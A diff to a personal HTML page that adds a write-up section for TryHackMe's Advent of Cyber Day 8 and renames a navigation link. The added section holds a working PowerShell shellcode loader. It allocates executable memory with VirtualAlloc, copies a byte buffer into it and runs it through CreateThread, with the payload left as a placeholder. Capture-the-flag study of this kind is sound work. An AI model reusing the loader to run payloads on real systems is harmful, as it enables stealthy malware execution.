@@ -49,10 +49,50 @@
 									*May not be for everyone and most were added from the DJ on Spotify
 									<br></br>
 									<body>
-										<h1>The Actual Shellcode<span style="font-size: smaller;"><i>Day8 - Advent of </i></span></h1>
+										<h1>The Actual Shellcode  <span style="font-size:30px" style="color:purple"><i>Day8 - Advent of Cyber</i></span></h1>
 									
 										<p>We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code. Below is a simple PowerShell script that will execute our shellcode:</p>
 									
+										<pre><code class="language-powershell">$VrtAlloc = @"
+									using System;
+									using System.Runtime.InteropServices;
+									
+									public class VrtAlloc{
+										[DllImport("kernel32")]
+										public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
+									}
+									"@
+									
+									Add-Type $VrtAlloc 
+									
+									$WaitFor= @"
+									using System;
+									using System.Runtime.InteropServices;
+									
+									public class WaitFor{
+									[DllImport("kernel32.dll", SetLastError=true)]
+										public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
+									}
+									"@
+									
+									Add-Type $WaitFor
+									
+									$CrtThread= @"
+									using System;
+									using System.Runtime.InteropServices;
+									
+									public class CrtThread{
+									[DllImport("kernel32", CharSet=CharSet.Ansi)]
+										public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+									}
+									"@
+									Add-Type $CrtThread   
+									
+									[Byte[]] $buf = SHELLCODE_PLACEHOLDER
+									[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+									[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
+									$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
+									[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")</code></pre>
 									
 										<p>Phew! That's a lot of code. But don't stress. We'll break down what it does step by step.</p>
 									
@@ -164,7 +204,7 @@
 										<li>
 											<span class="opener">TryHackMe</span>
 											<ul>
-												<li><a href="#">Lorem Dolor</a></li>
+												<li><a href="#">aoc.html</a></li>
 												<li><a href="#">Ipsum Adipiscing</a></li>
 												<li><a href="#">Tempus Magna</a></li>
 												<li><a href="#">SkyNet</a></li>
